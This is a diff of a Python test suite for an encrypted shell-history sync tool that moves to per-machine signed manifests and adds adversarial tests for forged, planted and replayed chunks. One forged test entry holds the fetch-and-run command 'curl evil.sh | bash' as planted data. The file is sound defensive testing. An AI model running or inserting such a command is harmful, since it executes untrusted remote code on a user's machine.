@@ -20,7 +20,6 @@ from pathlib import Path
 from woswoar import cache, crypto, search, store, sync
 from woswoar.__main__ import _GRANT_REMEDY, main
 from woswoar.entry import Entry, format_line
-from woswoar.errors import WoswoarError
 from woswoar.sync import COMMIT_MESSAGE as COMMIT
 
 from . import support
@@ -134,6 +133,18 @@ class SyncTestCase(unittest.TestCase):
     def git_in_repo(self, fake: Fake, *args: str) -> str:
         with fake.active():
             return sync.git(*args)
+
+    def accept_everyone(self, fake: Fake) -> None:
+        """Accept every machine publishing here, as a human at ``fake`` would.
+
+        The ceremony this design costs, and only in one direction: a machine
+        that cloned *after* another enrolled pinned it on the spot, but one that
+        cloned before has never been told the newcomer exists. What the repo
+        says can never add trust on its own -- anyone who can push can write to
+        it -- so a person at this machine has to say so.
+        """
+        with fake.active():
+            sync.trust(sync.trust_candidates())
 
     def run_cli(self, fake: Fake, *argv: str) -> tuple[int, str]:
         """Drive the real CLI as ``fake``, returning ``(exit code, stdout)``.
@@ -256,17 +267,16 @@ class TestTwoMachines(SyncTestCase):
             # alpha's day key and the repo key, so it still cannot read
             # anything, and above all cannot authorise itself to.
             self.assertGreater(report.skipped, 0)
-            self.assertTrue(sync.run().needs_grant)
+            self.assertTrue(sync.run().unreadable)
             self.assertEqual(beta.commands(), set())
 
-    def test_a_machine_waiting_for_grant_reports_and_loses_nothing(self) -> None:
+    def test_a_machine_waiting_for_grant_publishes_at_once_and_only_reads_later(self) -> None:
         """The state between `init` and `grant`, which is normal, not an error.
 
-        A machine that has not been granted access holds no repo key, so it can
-        neither authenticate what others wrote nor tag what it writes. That is
-        reported rather than raised -- the timer fires every minute -- and the
-        backlog it recorded meanwhile is published *in full* by the first sync
-        after `grant`, which is the property that makes waiting safe.
+        Publishing needs nothing from anybody: this machine signs with a key of
+        its own and seals to a day key it mints itself. Only *reading* waits.
+        That is a change -- under the shared key it could not tag a chunk
+        either, so its own history piled up locally until someone else acted.
         """
         alpha = self.machine("alpha")
         with alpha.active():
@@ -277,35 +287,21 @@ class TestTwoMachines(SyncTestCase):
         with beta.active():
             beta.record("2023-11-15", 1_700_100_000, "beta's own command")
             report = sync.run()
-            self.assertTrue(report.needs_grant)
-            self.assertEqual(report.lines_exported, 0)
-            self.assertEqual(beta.commands(), {"beta's own command"})  # recorded locally
+            self.assertEqual(report.lines_exported, 1, "beta should publish without waiting")
+            self.assertTrue(report.unreadable, "but it cannot read alpha's history yet")
+            self.assertEqual(beta.commands(), {"beta's own command"})
+
+        # And alpha, which cloned first, sees it once a human there accepts it.
+        self.accept_everyone(alpha)
+        with alpha.active():
+            self.assertEqual(sync.run().lines_imported, 1)
+            self.assertIn("beta's own command", alpha.commands())
 
         with alpha.active():
             sync.grant()
-
-        with beta.active():
-            report = sync.run()
-            self.assertFalse(report.needs_grant)
-            self.assertEqual(report.lines_exported, 1, "the backlog was not published")
-            self.assertEqual(beta.commands(), {"git status", "beta's own command"})
-
-    def test_bidirectional(self) -> None:
-        alpha = self.machine("alpha")
-        beta = self.machine("beta")
-        with alpha.active():
-            alpha.record("2023-11-14", 1_700_000_001, "from alpha")
-            sync.run()
-            sync.grant()
-        with beta.active():
-            beta.record("2023-11-14", 1_700_000_050, "from beta")
-            sync.run()
-        with alpha.active():
-            sync.run()
-            self.assertEqual(alpha.commands(), {"from alpha", "from beta"})
         with beta.active():
             sync.run()
-            self.assertEqual(beta.commands(), {"from alpha", "from beta"})
+            self.assertEqual(beta.commands(), {"beta's own command", "git status"})
 
     def test_merging_is_idempotent(self) -> None:
         alpha = self.machine("alpha")
@@ -401,21 +397,32 @@ class TestImmutability(SyncTestCase):
             "--",
             "hosts",
         )
-        rewritten = {line for line in touched.splitlines() if line.endswith(".age")}
+        # Every rewritten path, not just the `*.age` ones. Filtering by suffix
+        # first made the allowlist below vacuous for anything not named `.age`,
+        # so a rewritten manifest -- or any future file -- would have sailed
+        # through an assertion that reads like it covers the tree.
+        rewritten = {line for line in touched.splitlines() if line.strip()}
 
-        # Chunks live under hosts/<id>/YYYY-MM-DD/. Key files and name seals sit
-        # elsewhere in the tree and *are* rewritten, by design: that is exactly
-        # what makes onboarding cheap. Separating the two here keeps the
-        # exception explicit rather than quietly widening the invariant.
-        # Classified by store, not by a regex copied here: a hand-maintained
-        # pattern would silently stop matching if the layout ever changed,
-        # leaving this assertion vacuously true while real chunks were rewritten.
+        # Chunks live under hosts/<id>/YYYY-MM-DD/. Key files, name seals,
+        # signer keys and manifests sit elsewhere in the tree and *are*
+        # rewritten, by design: that is what makes onboarding cheap and what
+        # lets a day's signed list grow as the day goes on. Separating the two
+        # here keeps the exception explicit rather than quietly widening the
+        # invariant. Classified by store, not by a regex copied here: a
+        # hand-maintained pattern would silently stop matching if the layout
+        # changed, leaving this vacuously true while real chunks were rewritten.
         chunks = {p for p in rewritten if store.is_chunk_path(p)}
         self.assertEqual(sorted(chunks), [], f"chunks were rewritten: {sorted(chunks)}")
 
         # And the only things that were rewritten are the ones allowed to be.
+        allowed = ("/keys/", "/manifests/")
         self.assertTrue(
-            all(("/keys/" in p or p.endswith("/name.age")) for p in rewritten),
+            all(
+                any(part in p for part in allowed)
+                or p.endswith("/name.age")
+                or p.endswith("/signer.pub")
+                for p in rewritten
+            ),
             f"unexpected rewrites: {sorted(rewritten - chunks)}",
         )
 
@@ -676,13 +683,14 @@ class TestRevokeSubtraction(SyncTestCase):
 
         with alpha.active():
             sync.grant(approved=[reader.key for reader in sync.readers()])
+            sealed = store.name_seal(store.machine().id)
             # Opens for beta here, which is what makes the failure below a
             # consequence of the revocation rather than of never having access.
-            crypto.decrypt_with_file(store.mac_key_file().read_bytes(), beta_identity)
+            crypto.decrypt_with_file(sealed.read_bytes(), beta_identity)
 
             report = sync.revoke(sync.find_reader(crypto.fingerprint(beta_key)))
             self.assertGreater(report.resealed, 0)
-            resealed = store.mac_key_file().read_bytes()
+            resealed = sealed.read_bytes()
 
         with self.assertRaises(crypto.AgeError):
             crypto.decrypt_with_file(resealed, beta_identity)
@@ -765,7 +773,6 @@ class TestRevokeSubtraction(SyncTestCase):
 
         with beta.active():
             report = sync.run()
-        self.assertTrue(report.needs_grant)
         self.assertTrue(report.revoked)
 
         buffer = io.StringIO()
@@ -777,12 +784,15 @@ class TestRevokeSubtraction(SyncTestCase):
 
     def test_a_machine_merely_waiting_for_a_grant_is_not_told_it_was_revoked(self) -> None:
         alpha = self.machine("alpha")
-        beta = self.machine("beta")
         with alpha.active():
+            # Published *before* beta exists, so its day key is sealed to a list
+            # beta is not on. That is the only thing `grant` is still needed for.
+            alpha.record("2023-11-14", 1_700_000_001, "sealed before beta joined")
             sync.run()
+        beta = self.machine("beta")
         with beta.active():
             report = sync.run()
-        self.assertTrue(report.needs_grant)
+        self.assertTrue(report.unreadable, "beta is waiting for a grant, not revoked")
         self.assertFalse(report.revoked)
 
     def test_a_key_shaped_like_a_tombstone_is_refused(self) -> None:
@@ -790,6 +800,177 @@ class TestRevokeSubtraction(SyncTestCase):
         with alpha.active(), self.assertRaises(sync.SyncError) as caught:
             sync.add_recipient(f"-{crypto.generate_identity().public}", label="sneaky")
         self.assertIn("may not start with", str(caught.exception))
+
+
+class TestARevokedMachineCannotPublish(SyncTestCase):
+    """Issue #38, which is the whole point of per-machine signatures.
+
+    A revoked machine keeps its own signing key -- nobody can take it back --
+    and keeps every manifest it ever signed. What it loses is any peer willing
+    to accept them. That is only expressible because signing is asymmetric: with
+    the shared MAC these tests replaced, holding the key to *check* a chunk was
+    holding the key to *forge* one, so a revoked machine could publish forever.
+    """
+
+    def fleet(self) -> tuple[Fake, Fake, Fake]:
+        """alpha and beta enrolled and readable, gamma accepting both."""
+        alpha = self.machine("alpha")
+        beta = self.machine("beta")
+        gamma = self.machine("gamma")
+        with alpha.active():
+            # alpha publishes, so its day key exists for the cross-host test to
+            # seal against -- which is exactly what an attacker would find.
+            alpha.record("2023-11-14", 1_700_000_000, "alpha-history")
+            sync.run()
+            sync.grant(approved=[reader.key for reader in sync.readers()])
+        for machine in (beta, gamma):
+            with machine.active():
+                sync.run()
+        for machine in (alpha, beta, gamma):
+            self.accept_everyone(machine)
+        return alpha, beta, gamma
+
+    def publish_as_revoked(self, beta: Fake, day: str, ts: int, cmd: str) -> None:
+        """Everything beta can still do: seal, sign with its own key, push.
+
+        Deliberately not `sync.run`, which would notice beta is revoked and stop.
+        The question is not whether beta cooperates -- it is whether refusing
+        beta is a *decision the peers make*.
+        """
+        with beta.active():
+            beta.record(day, ts, cmd)
+            known = store.machine()
+            with sync.lock():
+                sync._fetch_and_rebase()
+                sync.export(known, sync.State.load(), sync.Report(), ts)
+                sync._commit()
+                sync._push()
+
+    def revoke_beta(self, alpha: Fake, beta: Fake) -> None:
+        with beta.active():
+            beta_key = crypto.recipient_for(sync.identity_path(store.machine())).strip()
+        with alpha.active():
+            sync.revoke(sync.find_reader(crypto.fingerprint(beta_key)))
+
+    def test_a_peer_refuses_what_a_revoked_machine_signs_afterwards(self) -> None:
+        alpha, beta, gamma = self.fleet()
+        with beta.active():
+            beta.record("2023-11-14", 1_700_000_001, "legitimate-beta-history")
+            sync.run()
+        with gamma.active():
+            sync.run()
+            self.assertIn("legitimate-beta-history", gamma.commands())
+
+        self.revoke_beta(alpha, beta)
+        self.publish_as_revoked(beta, "2023-11-15", 1_700_100_002, "after-the-revocation")
+
+        with gamma.active():
+            report = sync.run()
+            self.assertIn(beta.id, report.unpinned)
+            self.assertNotIn("after-the-revocation", gamma.commands())
+
+    def test_it_cannot_publish_under_another_machines_id_either(self) -> None:
+        """The cross-host version, and the one a shared key could never stop.
+
+        beta writes into *alpha's* host directory, where alpha would never look
+        -- `merge` skips your own id -- so only the other peers judge it. It can
+        seal the chunk perfectly well; what it cannot do is sign as alpha.
+        """
+        alpha, beta, gamma = self.fleet()
+        self.revoke_beta(alpha, beta)
+
+        with beta.active():
+            day = "2023-11-14"
+            with sync.lock():
+                sync._fetch_and_rebase()
+                pub = store.day_key_public(alpha.id, day)
+                entry = Entry(1_700_000_900, alpha.id, "s1", "~", 0, 5, "planted-under-alpha")
+                sealed = crypto.encrypt_to(
+                    sync.pack((format_line(entry) + "\n").encode("utf-8")),
+                    pub.read_text(encoding="utf-8").strip(),
+                )
+                target = store.chunk_dir(alpha.id, day) / "9999999999-ffffff.age"
+                target.parent.mkdir(parents=True, exist_ok=True)
+                target.write_bytes(sealed)
+                sync._commit()
+                sync._push()
+
+        with gamma.active():
+            sync.run()
+            self.assertNotIn("planted-under-alpha", gamma.commands())
+
+    def test_a_replayed_manifest_from_before_the_revocation_is_refused_too(self) -> None:
+        """beta keeps every manifest it signed; unpinning covers the old ones."""
+        alpha, beta, gamma = self.fleet()
+        with beta.active():
+            beta.record("2023-11-14", 1_700_000_001, "before-revocation")
+            sync.run()
+        self.revoke_beta(alpha, beta)
+
+        with gamma.active():
+            sync.run()  # sees the tombstone and drops the pin
+            report = sync.run()
+            self.assertNotIn(beta.id, sync.State.load().signers)
+            self.assertIn(beta.id, report.untrusted)
+
+    def test_trust_will_not_re_accept_a_revoked_machine(self) -> None:
+        """Otherwise the withdrawal is a suggestion: whoever it was aimed at
+        holds push access, so it could simply republish and be offered again."""
+        alpha, beta, gamma = self.fleet()
+        self.revoke_beta(alpha, beta)
+        with gamma.active():
+            sync.run()
+            offered = [c.host_id for c in sync.trust_candidates()]
+        self.assertNotIn(beta.id, offered)
+
+
+class TestExportNeverSignsWhatItDidNotWrite(SyncTestCase):
+    """`merge` skips this host's own id, so a chunk planted under it is the one
+    thing nothing else ever inspects.
+
+    If `export` built its manifest by listing the day's directory, an ordinary
+    sync would sign that chunk and hand every peer something they believe --
+    without even the `compact` run the old design needed. So the manifest is
+    *extended* from the one this machine last signed, never rebuilt from disk.
+    """
+
+    def test_a_chunk_planted_under_our_own_id_is_never_signed(self) -> None:
+        alpha = self.machine("alpha")
+        with alpha.active():
+            alpha.record("2023-11-14", 1_700_000_001, "ours")
+            sync.run()
+
+            planted = store.chunk_dir(alpha.id, "2023-11-14") / "9999999999-ffffff.age"
+            planted.write_bytes(b"whatever an attacker likes")
+
+            alpha.record("2023-11-14", 1_700_000_002, "ours too")
+            report = sync.run(now=1_900_000_000)
+
+            listed = sync.read_manifest(
+                alpha.id, "2023-11-14", crypto.signing_public(store.signing_key_file())
+            )
+            self.assertNotIn(planted.name, listed, "export signed a chunk it did not write")
+            self.assertIn(f"2023-11-14/{planted.name}", report.foreign)
+
+    def test_a_peer_refuses_the_planted_chunk(self) -> None:
+        alpha = self.machine("alpha")
+        with alpha.active():
+            alpha.record("2023-11-14", 1_700_000_001, "ours")
+            sync.run()
+        beta = self.machine("beta")
+        with alpha.active():
+            sync.grant()
+            entry = Entry(1_700_000_900, alpha.id, "s1", "~", 0, 5, "planted")
+            pub = store.day_key_public(alpha.id, "2023-11-14").read_text(encoding="utf-8").strip()
+            sealed = crypto.encrypt_to(sync.pack((format_line(entry) + "\n").encode("utf-8")), pub)
+            (store.chunk_dir(alpha.id, "2023-11-14") / "9999999999-ffffff.age").write_bytes(sealed)
+            alpha.record("2023-11-14", 1_700_000_002, "ours too")
+            sync.run(now=1_900_000_000)
+
+        with beta.active():
+            sync.run()
+            self.assertNotIn("planted", beta.commands())
+            self.assertIn("ours too", beta.commands())
 
 
 class TestFindReader(SyncTestCase):
@@ -847,7 +1028,7 @@ class TestRevokeConfirmation(SyncTestCase):
         self.assertEqual(code, 0)
         self.assertIn("does not un-publish", out)
         self.assertIn("does not revoke git access", out)
-        self.assertIn("WRITING", out)
+        self.assertIn("nothing that machine publishes is accepted", out)
         with alpha.active():
             self.assertNotIn(gone, sync.recipients())
 
@@ -1110,43 +1291,98 @@ class TestSyncIsPrivate(SyncTestCase):
             self.assertEqual(exposed, [], f"sync left {exposed} readable by others")
 
 
-class TestRepoKeyIsNeverMintedTwice(SyncTestCase):
-    """Creation belongs to `initialise`, opening to everything else.
+class TestASigningKeyThatChanges(SyncTestCase):
+    """A machine that starts signing with a different key is never waved through.
 
-    `mac.age` is one shared path at the repo root, unlike a day key, which
-    lives under a host id nobody else writes. If a routine sync minted it when
-    absent, two machines on the one-minute timer would each tag chunks with a
-    key the other will never hold -- and `.gitattributes` marks ``*.age
-    -merge``, so the rebase conflicts and the timer replays that conflict
-    forever.
+    It is either a machine that was re-enrolled after losing its key, or someone
+    rewriting the repo to publish as one of your machines. Nothing available to
+    a peer can tell those apart, so the peer refuses and says so, and a human
+    decides. Silently re-pinning would make the pin worthless: an attacker would
+    just publish a new `signer.pub` alongside the history they wanted believed.
     """
 
-    def test_sync_reports_rather_than_minting_a_replacement(self) -> None:
+    def test_losing_the_signing_key_mints_a_new_one_rather_than_stopping(self) -> None:
+        # Recording and publishing must not depend on a file the user could
+        # delete; the consequence lands on the peers, loudly, where it can be
+        # judged.
         alpha = self.machine("alpha")
         with alpha.active():
+            first = crypto.signing_public(store.signing_key_file())
+            store.signing_key_file().unlink()
+            store.signing_key_file().with_suffix(".pub").unlink()
+
             alpha.record("2023-11-14", 1_700_000_001, "git status")
-            sync.run()
-            before = store.mac_key_file().read_bytes()
-            store.mac_key_file().unlink()
-
             report = sync.run()
-            self.assertTrue(report.needs_grant, "a missing repo key was papered over")
-            self.assertFalse(store.mac_key_file().is_file(), "sync minted a competing repo key")
-            self.assertEqual(report.chunks_written, 0)
+            self.assertEqual(report.chunks_written, 1)
+            self.assertNotEqual(crypto.signing_public(store.signing_key_file()), first)
 
-            # And the real one still works once it is back.
-            store.write_atomic(store.mac_key_file(), before)
-            self.assertFalse(sync.run().needs_grant)
+    def test_a_peer_refuses_the_new_key_and_keeps_the_old_pin(self) -> None:
+        alpha, beta = self.enrolled_pair()
+        with alpha.active():
+            pinned_before = sync.State.load().signers[alpha.id]
+            store.signing_key_file().unlink()
+            store.signing_key_file().with_suffix(".pub").unlink()
+            # A new day: days it already signed are frozen under the old key,
+            # so publishing there would test nothing about the peer's refusal.
+            alpha.record("2023-11-20", 1_700_500_002, "after-the-key-changed")
+            self.assertEqual(sync.run(now=1_900_000_000).chunks_written, 1)
 
-    def test_compacting_without_the_repo_key_refuses(self) -> None:
+        with beta.active():
+            report = sync.run()
+            self.assertEqual(report.changed_signer, {alpha.id})
+            self.assertNotIn("after-the-key-changed", beta.commands())
+            # The old pin survives: a refusal must not quietly become an update.
+            self.assertEqual(sync.State.load().signers[alpha.id], pinned_before)
+
+    def test_a_human_can_accept_the_new_key_and_history_flows_again(self) -> None:
+        alpha, beta = self.enrolled_pair()
+        with alpha.active():
+            store.signing_key_file().unlink()
+            store.signing_key_file().with_suffix(".pub").unlink()
+            # A *new* day. Days it already signed are frozen -- see below.
+            alpha.record("2023-11-20", 1_700_500_002, "after-the-key-changed")
+            sync.run(now=1_900_000_000)
+
+        with beta.active():
+            sync.run()
+            code, _ = self.run_cli(beta, "trust", "--replace", "--yes")
+            self.assertEqual(code, 0)
+            sync.run()
+            self.assertIn("after-the-key-changed", beta.commands())
+
+    def test_days_it_already_signed_are_frozen_by_the_new_key(self) -> None:
+        """A consequence worth being plain about rather than discovering.
+
+        The old manifest was signed with the key that is gone, so this machine
+        can no longer verify its own record of what it published that day.
+        Signing a replacement would disown those chunks; refusing keeps them.
+        New days are unaffected, so the machine is not stuck.
+        """
         alpha = self.machine("alpha")
         with alpha.active():
-            for i in range(2):
-                alpha.record("2023-11-14", 1_700_000_000 + i, f"command {i}")
-                sync.run()
-            store.mac_key_file().unlink()
-            with self.assertRaises(WoswoarError):
-                sync.compact(before="2023-11-15")
+            alpha.record("2023-11-14", 1_700_000_001, "before the key changed")
+            sync.run()
+            store.signing_key_file().unlink()
+            store.signing_key_file().with_suffix(".pub").unlink()
+
+            alpha.record("2023-11-14", 1_700_000_002, "same day, new key")
+            alpha.record("2023-11-20", 1_700_500_002, "a fresh day")
+            report = sync.run(now=1_900_000_000)
+
+        self.assertEqual(report.unsignable, {"2023-11-14"})
+        self.assertEqual(report.chunks_written, 1, "the fresh day should still publish")
+
+    def enrolled_pair(self) -> tuple[Fake, Fake]:
+        alpha = self.machine("alpha")
+        with alpha.active():
+            alpha.record("2023-11-14", 1_700_000_001, "make -j8")
+            sync.run()
+        beta = self.machine("beta")
+        with alpha.active():
+            sync.grant()
+        with beta.active():
+            sync.run()
+        return alpha, beta
 
 
 class TestMergedHistoryIsStoredFaithfully(SyncTestCase):
@@ -1208,24 +1444,22 @@ class TestChunkAuthenticity(SyncTestCase):
         host_id: str,
         day: str,
         cmd: str,
-        tag: bytes = b"",
         name: str = "9999999999-ffffff",
     ) -> None:
         """A chunk sealed to a host's *published* day key, but not authentic.
 
-        ``tag`` empty writes it untagged, which is what an attacker holding no
-        enrolled identity can actually produce; passing bytes writes a wrong
-        tag. Both must be refused, so both are exercised.
+        Byte-for-byte a well-formed chunk -- the day's public key sits in the
+        clear, so sealing one needs no secret at all. What the attacker cannot
+        do is get it into a manifest the host signed.
         """
         pub = (work / "hosts" / host_id / "keys" / f"{day}.pub").read_text(encoding="utf-8").strip()
         entry = Entry(1_700_000_900, host_id, "s1", "~", 0, 5, cmd)
         payload = sync.pack((format_line(entry) + "\n").encode("utf-8"))
         # Named far in the future so it sorts above whatever the real machine
         # has published; a forgery the watermark skips proves nothing.
-        sealed = crypto.encrypt_to(payload, pub)
         target = work / "hosts" / host_id / day / f"{name}.age"
         target.parent.mkdir(parents=True, exist_ok=True)
-        target.write_bytes(store.frame_chunk(sealed, tag) if tag else sealed)
+        target.write_bytes(crypto.encrypt_to(payload, pub))
 
     def enrolled_pair(self) -> tuple[Fake, Fake]:
         """alpha publishing history, beta granted and up to date."""
@@ -1241,34 +1475,13 @@ class TestChunkAuthenticity(SyncTestCase):
             self.assertEqual(beta.commands(), {"make -j8"})
         return alpha, beta
 
-    def test_every_exported_chunk_carries_a_tag(self) -> None:
-        alpha = self.machine("alpha")
-        with alpha.active():
-            alpha.record("2023-11-14", 1_700_000_001, "git status")
-            sync.run()
-            mac = sync.mac_key(store.machine())
-            chunks = list(store.iter_chunks(alpha.id))
-            self.assertTrue(chunks)
-            for chunk in chunks:
-                sealed, tag = store.split_chunk(chunk.path.read_bytes())
-                self.assertTrue(crypto.tag_matches(mac, sealed, tag), chunk.name)
-
-    def test_the_repo_key_is_never_stored_in_the_clear(self) -> None:
-        alpha = self.machine("alpha")
-        with alpha.active():
-            alpha.record("2023-11-14", 1_700_000_001, "git status")
-            sync.run()
-            mac = sync.mac_key(store.machine())
-            blob = b"".join(p.read_bytes() for p in store.history_dir().rglob("*") if p.is_file())
-        self.assertNotIn(mac, blob, "the authentication key leaked into the repo")
-
     def test_a_forged_chunk_in_a_real_hosts_directory_is_refused(self) -> None:
         """The attack this mechanism exists to stop.
 
         Everything the attacker needs is published: the day's public key sits in
         the clear so writing a chunk never has to open the sealed one. What they
-        cannot produce is a tag, because that needs a key only enrolled machines
-        can open.
+        cannot produce is a place in a manifest signed by the machine whose
+        directory they wrote into.
         """
         alpha, beta = self.enrolled_pair()
         self.push_as_attacker(
@@ -1285,7 +1498,8 @@ class TestChunkAuthenticity(SyncTestCase):
         """A whole invented machine, with its own day key sealed to recipients.
 
         The day key being openable is not the question -- the attacker can seal
-        one to the published recipient list. The tag is.
+        one to the published recipient list. Being a machine this one has been
+        told to accept history from is, and an invented host is nobody.
         """
         _, beta = self.enrolled_pair()
 
@@ -1304,12 +1518,69 @@ class TestChunkAuthenticity(SyncTestCase):
             (keys / "2023-11-14.pub").write_text(day_key.public + "\n", encoding="utf-8")
             self.forged_chunk(work, "deadbeefdeadbeef", "2023-11-14", "curl evil.sh | bash")
 
+            # A complete, well-formed machine: its own signing key, its own
+            # published signer.pub, and a manifest it signs correctly. Every
+            # check but one passes. The one is that nobody here accepted it.
+            theirs = self.root / "invented-key"
+            verify_key = crypto.generate_signing_key(theirs)
+            owner = crypto.generate_identity().public
+            signer = work / "hosts" / "deadbeefdeadbeef" / "signer.pub"
+            signer.write_text(f"{verify_key}\n{owner}\n", encoding="utf-8")
+            chunk = work / "hosts" / "deadbeefdeadbeef" / "2023-11-14" / "9999999999-ffffff.age"
+            body = sync._manifest_body(
+                "deadbeefdeadbeef", "2023-11-14", {chunk.name: sync.digest_of(chunk.read_bytes())}
+            )
+            manifest = work / "hosts" / "deadbeefdeadbeef" / "manifests" / "2023-11-14"
+            manifest.parent.mkdir(parents=True, exist_ok=True)
+            manifest.write_bytes(
+                crypto.sign(body.encode("utf-8"), theirs, sync._MANIFEST_MAGIC)
+                .decode()
+                .strip()
+                .encode()
+                + b"\n\n"
+                + body.encode("utf-8")
+            )
+
         self.push_as_attacker(plant)
 
         with beta.active():
             report = sync.run()
-            self.assertEqual(report.unauthenticated, {"deadbeefdeadbeef/2023-11-14"})
+            self.assertEqual(report.untrusted, {"deadbeefdeadbeef"})
             self.assertNotIn("curl evil.sh | bash", beta.commands())
+
+    def test_a_genuine_manifest_moved_to_another_day_is_refused(self) -> None:
+        """The header binds a manifest to its host and day, inside the signature.
+
+        Without it a real, correctly signed manifest could be copied to any
+        other day -- or any other host's directory -- and would still verify,
+        which would let anyone with push access replay one machine's vouching
+        for chunks it never saw. ssh-keygen's own principal matching cannot do
+        this job, so the binding is in the bytes that are signed.
+        """
+        alpha, beta = self.enrolled_pair()
+
+        def plant(work: Path) -> None:
+            genuine = (work / "hosts" / alpha.id / "manifests" / "2023-11-14").read_bytes()
+            # Verbatim, signature and all, one day over.
+            moved = work / "hosts" / alpha.id / "manifests" / "2023-11-15"
+            moved.write_bytes(genuine)
+            # And the chunk it names, so only the header stands in the way.
+            body = genuine.split(b"\n\n", 1)[1].decode("utf-8")
+            name = body.splitlines()[1].split(" ")[0]
+            source = work / "hosts" / alpha.id / "2023-11-14" / name
+            target = work / "hosts" / alpha.id / "2023-11-15" / name
+            target.parent.mkdir(parents=True, exist_ok=True)
+            target.write_bytes(source.read_bytes())
+            keys = work / "hosts" / alpha.id / "keys"
+            for suffix in (".age", ".pub"):
+                source_key = keys / f"2023-11-14{suffix}"
+                (keys / f"2023-11-15{suffix}").write_bytes(source_key.read_bytes())
+
+        self.push_as_attacker(plant)
+
+        with beta.active():
+            report = sync.run()
+            self.assertIn(f"{alpha.id}/2023-11-15", report.unauthenticated)
 
     def test_tampering_with_an_authentic_chunk_is_refused(self) -> None:
         """Flipping bytes in a real chunk must not merely fail to decrypt."""
@@ -1338,30 +1609,44 @@ class TestChunkAuthenticity(SyncTestCase):
         with beta.active():
             self.assertEqual(sync.run().unauthenticated, {f"{alpha.id}/2023-11-14"})
 
-    def test_a_wrongly_tagged_chunk_is_refused_like_an_untagged_one(self) -> None:
-        """ "No tag" and "wrong tag" must reach the same answer.
+    def test_a_chunk_listed_by_the_wrong_signer_is_refused_like_an_unlisted_one(self) -> None:
+        """ "No manifest" and "manifest signed by someone else" are one answer.
 
         Anything else is the downgrade: an attacker would simply pick whichever
-        shape was treated more leniently.
+        shape was treated more leniently. They can generate a signing key freely
+        -- what they cannot do is make it the one this machine accepts for that
+        host.
         """
         alpha, beta = self.enrolled_pair()
-        self.push_as_attacker(
-            lambda work: self.forged_chunk(
-                work, alpha.id, "2023-11-14", "wrongly-tagged", tag=b"\x00" * 32
+
+        def plant(work: Path) -> None:
+            self.forged_chunk(work, alpha.id, "2023-11-14", "signed-by-a-stranger")
+            chunk = work / "hosts" / alpha.id / "2023-11-14" / "9999999999-ffffff.age"
+            theirs = self.root / "attacker-key"
+            crypto.generate_signing_key(theirs)
+            body = sync._manifest_body(
+                alpha.id, "2023-11-14", {chunk.name: sync.digest_of(chunk.read_bytes())}
             )
-        )
+            signature = crypto.sign(body.encode("utf-8"), theirs, sync._MANIFEST_MAGIC)
+            manifest = work / "hosts" / alpha.id / "manifests" / "2023-11-14"
+            manifest.parent.mkdir(parents=True, exist_ok=True)
+            manifest.write_bytes(
+                signature.decode("utf-8").strip().encode() + b"\n\n" + body.encode("utf-8")
+            )
+
+        self.push_as_attacker(plant)
 
         with beta.active():
             report = sync.run()
             self.assertEqual(report.unauthenticated, {f"{alpha.id}/2023-11-14"})
-            self.assertNotIn("wrongly-tagged", beta.commands())
+            self.assertNotIn("signed-by-a-stranger", beta.commands())
 
     def test_compact_refuses_to_launder_a_chunk_this_machine_did_not_write(self) -> None:
         """`merge` skips our own host id, so compaction is where this is caught.
 
-        Compaction re-seals and re-tags whatever it merges, then deletes the
+        Compaction re-seals and re-signs whatever it merges, then deletes the
         originals -- so a chunk planted under our *own* id would come out
-        carrying a tag every other machine believes, with the evidence gone.
+        carrying this machine's own signature, with the evidence gone.
         It has to refuse rather than launder.
         """
         alpha, _ = self.enrolled_pair()
@@ -1376,6 +1661,50 @@ class TestChunkAuthenticity(SyncTestCase):
             self.assertIn("refusing to compact", str(caught.exception))
             # And it is still there, not silently dropped.
             self.assertTrue(list(store.iter_chunks(alpha.id)))
+
+
+class TestExportWillNotDisownItsOwnHistory(SyncTestCase):
+    """A day whose signed list this machine cannot verify is left alone.
+
+    Signing a fresh manifest would drop every chunk published earlier that day
+    out of the signed list, and peers would then refuse them -- so a file
+    anybody with push access can corrupt would cost you published history.
+    """
+
+    def test_a_corrupted_own_manifest_stops_that_day_rather_than_truncating_it(self) -> None:
+        alpha = self.machine("alpha")
+        with alpha.active():
+            alpha.record("2023-11-14", 1_700_000_001, "published earlier")
+            sync.run()
+            before = sync.read_manifest(
+                alpha.id, "2023-11-14", crypto.signing_public(store.signing_key_file())
+            )
+            self.assertEqual(len(before), 1)
+
+            store.day_manifest(alpha.id, "2023-11-14").write_text("wrecked", encoding="utf-8")
+            alpha.record("2023-11-14", 1_700_000_002, "published later")
+            report = sync.run(now=1_900_000_000)
+
+            self.assertIn("2023-11-14", report.unsignable)
+            self.assertEqual(
+                report.chunks_written, 0, "a chunk was written with no list to hold it"
+            )
+
+    def test_another_day_is_unaffected(self) -> None:
+        alpha = self.machine("alpha")
+        with alpha.active():
+            alpha.record("2023-11-14", 1_700_000_001, "day one")
+            sync.run()
+            store.day_manifest(alpha.id, "2023-11-14").write_text("wrecked", encoding="utf-8")
+
+            # Both days have something to publish, so both are attempted; only
+            # the one whose signed list is unreadable is held back. A day with
+            # nothing new is never touched at all, corrupt manifest or not.
+            alpha.record("2023-11-14", 1_700_000_002, "day one, again")
+            alpha.record("2023-11-15", 1_700_100_001, "day two")
+            report = sync.run(now=1_900_000_000)
+            self.assertEqual(report.chunks_written, 1)
+            self.assertEqual(report.unsignable, {"2023-11-14"})
 
 
 if __name__ == "__main__":
